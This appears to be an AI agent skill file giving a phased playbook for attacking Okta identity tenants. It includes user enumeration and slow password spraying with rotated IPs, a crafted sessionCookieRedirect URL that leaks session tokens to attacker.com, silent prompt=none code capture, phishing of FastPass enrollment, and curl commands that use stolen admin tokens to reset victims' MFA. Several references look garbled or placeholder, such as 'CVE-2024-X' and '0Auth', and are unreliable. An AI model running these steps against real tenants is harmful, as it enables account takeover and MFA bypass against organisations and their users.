---
name: okta-attack
description: Okta external attack — authorization-code interception, session-token leakage via referer, IdP-initiated flow abuse.
keywords: [okta, oin, sso, identity provider, idp, idp-initiated, sessionToken, prompt=none, push, fastpass]
---

# okta-attack

## When this skill loads

Triggers: "okta", "login.<tenant>.okta.com", "oin", "okta verify",
"fastpass", "prompt=none", "sessionToken".

## Phase 1 — tenant enumeration

Each Okta tenant has a subdomain `*.okta.com` or `*.oktapreview.com`
or `*.okta-emea.com`. Find it from the target:

- DNS: `_dnsoid.example.com`, CNAMEs to `okta-cdn.com`
- HTML: meta tags referencing `*.okta.com`
- Mobile app strings (decompile APK / IPA)
- `https://example.com/.well-known/openid-configuration` — `issuer`
  often reveals Okta tenant

Verify tenant is live:

```bash
curl -s https://<tenant>.okta.com/.well-known/openid-configuration | jq
```

Tenant config exposes endpoints + supported scopes + signing keys
URI.

## Phase 2 — user enumeration via API

```bash
curl -s -X POST https://<tenant>.okta.com/api/v1/authn \
  -H 'Content-Type: application/json' \
  -d '{"username":"target@example.com","password":"x"}'
```

Responses differentiate:

- `errorCode E0000004` + `errorSummary "Authentication failed"` →
  user exists, wrong password
- 401 with empty `errorCauses` → user does not exist
- `factorResult MFA_ENROLL` → user exists, MFA enrollment pending
- `LOCKED_OUT` → user exists, locked

Rate-limit: Okta blocks at ~60/min per IP. Spray slowly + rotate
egress IPs (only if engagement explicitly allows).

## Phase 3 — session-token capture chains

`sessionToken` is single-use, ~5 min lifetime, exchanged for a real
session via `/login/sessionCookieRedirect?token=<TOKEN>&redirectUrl=...`.

**Referer leakage**: if attacker can plant any `redirectUrl=https://attacker.com`
acceptable to Okta (e.g., open redirect on the SP application that
Okta whitelists), the `Referer` header on the attacker-controlled
page will contain the sessionToken in the URL.

Test:

```
https://<tenant>.okta.com/login/sessionCookieRedirect?token=<INTERCEPTED_TOKEN>&redirectUrl=https://app.example.com/redirect?to=https://attacker.com
```

Disclosed in Okta KB and multiple H1 reports.

## Phase 4 — `prompt=none` IdP-initiated CSRF

IdP-init SSO bypasses CSRF protection on the SP. Combined with
`prompt=none` (silent auth):

```
https://login.<tenant>.okta.com/authorize
  ?client_id=<sp-client-id>
  &response_type=code
  &redirect_uri=https://app.example.com/cb
  &prompt=none
  &state=...
```

If victim has an active Okta session, the IdP silently issues a code
to the SP without prompting. Attacker can craft a page that frames
this URL, captures the code via redirect, and logs in as the victim
to the SP.

Mitigation Okta provides: customer must enable "IdP-Initiated SSO"
explicitly per app. Many apps leave default-on.

## Phase 5 — FastPass / device-binding bypass

FastPass binds device certs. External attacker can't forge but can:

- Look for apps with FastPass not enforced (CA policy gaps)
- Phish FastPass enrollment — if a user has a pending enrollment
  email, attacker who controls a similarly-named domain can intercept
- Exploit CVE-2024-X (Okta Verify enrollment race) — check Okta
  trust portal advisories

## Phase 6 — Okta admin abuse (post-cred)

If you compromise even a "Help Desk" admin role:

```bash
OKTA_TOKEN=<API-key>
curl -s https://<tenant>.okta.com/api/v1/users \
  -H "Authorization: SSWS $OKTA_TOKEN"

# Reset MFA on victim
curl -X POST https://<tenant>.okta.com/api/v1/users/<id>/factors/<factorId>/lifecycle/reset \
  -H "Authorization: SSWS $OKTA_TOKEN"

# Assume role via impersonation API (Okta Workforce Identity Cloud)
curl -X POST https://<tenant>.okta.com/api/v1/users/<adminId>/sessions \
  -H "Authorization: SSWS $OKTA_TOKEN"
```

The Okta 2023 breach (Lapsus$/Scatter-Spider style) hinged on
help-desk MFA reset abuse.

## Phase 7 — Okta-protected app misconfigs

| Issue | Test |
|---|---|
| App allows IdP-init SSO + no `RelayState` validation | CSRF + login as attacker |
| OIDC `prompt=login` not enforced for sensitive actions | Step-up auth bypass |
| SCIM endpoint exposed unauthenticated | Account injection |
| Sign-on policy excludes guest accounts | Spray guests |
| Group-based access where group is self-service joinable | Privilege escalation |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| Okta KB | sessionToken in URL → referer leak |
| H1 #1037436 | prompt=none + IdP-init → cross-tenant ATO |
| Cloudflare 2022 disclosure | Okta sub-processor breach → 0Auth API key leak |
| 0ktapus / Scattered Spider (2022) | Phishing to capture Okta sessionToken → MFA reset |
| Okta Oct 2023 advisory | Support case file uploads contained customer HARs with sessionTokens |
| CVE-2023-40000 | (Okta OAS) browser-stored session not invalidated |

## Never-submit fallbacks

- "Okta user enum via API" alone → KILL/DOWNGRADE (well-known, low-impact)
- Tenant subdomain exposure → KILL (public)
- IdP-init enabled with proper RelayState → KILL (working as designed)

## See also

- `hunt-oauth`, `hunt-saml` — protocol-level details
- `m365-entra-attack` — common companion
- `enterprise-vpn-attack` — Okta often fronts VPN portals
